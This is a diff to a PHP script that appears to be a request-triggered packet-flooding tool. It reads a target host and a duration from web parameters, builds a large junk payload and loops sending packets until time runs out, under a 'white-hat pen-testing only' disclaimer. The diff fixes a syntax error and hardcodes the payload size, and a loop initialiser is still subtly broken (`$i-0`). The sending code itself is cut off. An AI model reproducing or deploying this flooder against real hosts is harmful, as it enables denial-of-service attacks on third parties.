@@ -16,13 +16,16 @@ intended for white-hat security pen-testing only, or educational use only.
 //ini_set('display_errors', 1);
 //error_reporting(-1);
 
-if (isset($_REQUEST['host']) && isset($_REQUEST['time']) isset($_REQUEST['power']) ) {
+if (isset($_REQUEST['host']) && (isset($_REQUEST['time'])) /* (isset($_REQUEST['power'])) */ ) {
+
     $packets = 0;
     $host = $_REQUEST['host'];
     $power = $_REQUEST['power'];
     $exec_time = $_REQUEST['time'];
     $time = time();
     $max_time = $time+$exec_time;
+
+    /*
 
     if ($power == null) {
         $power = 65500;
@@ -34,10 +37,13 @@ if (isset($_REQUEST['host']) && isset($_REQUEST['time']) isset($_REQUEST['power'
        $power = 65500;
     }
 
-    for($i-0;$i<$power;$i++) {
+    */
+
+    for($i-0;$i< 65000;$i++) {
         $out .='Port Scanning';
 
     }
+
     while(1) {
         $packets++;
         if(time() > $max_time) {
